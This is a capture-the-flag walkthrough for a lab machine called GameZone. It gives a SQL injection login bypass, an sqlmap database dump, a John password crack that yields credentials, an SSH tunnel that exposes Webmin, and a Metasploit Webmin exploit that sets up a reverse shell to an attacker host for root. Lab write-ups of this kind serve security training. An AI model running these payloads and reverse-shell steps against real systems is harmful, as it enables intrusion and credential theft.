# GameZone 

Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

## Recon
`nmap -A -T4 10.80.131.236`

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Game Zone
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
```

## Unauthorized Access via SQLi
Login to web service using SQLi with the user set as `' OR 1=1 -- -` and the password set as blank

## SQLMap 
SQLMap can be used to dump the entire GameZone database: 

(1) Intercept a request through the search feature with Burp Suite. 
(2) Pass this request into SQLMap to use the authenticated user session: `sqlmap -r request.txt --dbms=mysql --dump`

Found a hashed password for user `agent47`: `ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14`

## Hashcracking with John 

`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256`

Credentials => `agent47:videogamer124`

ssh agent47@10.80.131.236

## Exposing Services with Reverse SSH Tunnels

Reverse port forwarding => a specified port on a remote server host can be forwarded to a given local host & port
- Flag -L specifies the use of a local tunnel, forwarding server-side traffic to a controlled server and viewing it, i.e. imgur blocked at work but can view it by: 
    `ssh -L 900:imgur.com:80 user@example.com`
- Flag -R specifies the use of a remote tunnel, forwarding client-side traffic to the other server for others to view 

The `ss` tool can be used to investigate sockets running on a host: `ss -tulpn` shows what socket connections are running
    -t	Display TCP sockets
    -u	Display UDP sockets
    -l	Displays only listening sockets
    -p	Shows the process using the socket
    -n	Doesn't resolve service names

5 TCP sockets are running. Service on port 10000 is running but is externally blocked via a firewall. 

To forward the service to a local reverse tunnel, run the command on the attacking machine: `ssh -L 10000:Localhost:10000 joaquin@192.168.174.8`

Exposed CMS on port 10000 => Webmin, accessed using previously obtained credentials with `agent47:videogamer124`
Webmin is running on version 1.580.


## Privilege Escalation
Use metasploit to find a payload to execute against the machine using the CMS dashboard version. 

`search webmin 1.580`
`use exploit/unix/webapp/webmin_show_cgi_exec`
    `set RHOSTS`
    `set USERNAME agent47`
    `set PASSWORD videogamer124`
    `set SSL false`

`show payloads`
`set PAYLOAD cmd/unix/reverse`
    `set LHOST 192.168.174.8`
    `set LPORT 4444`

`run`

Root obtained.

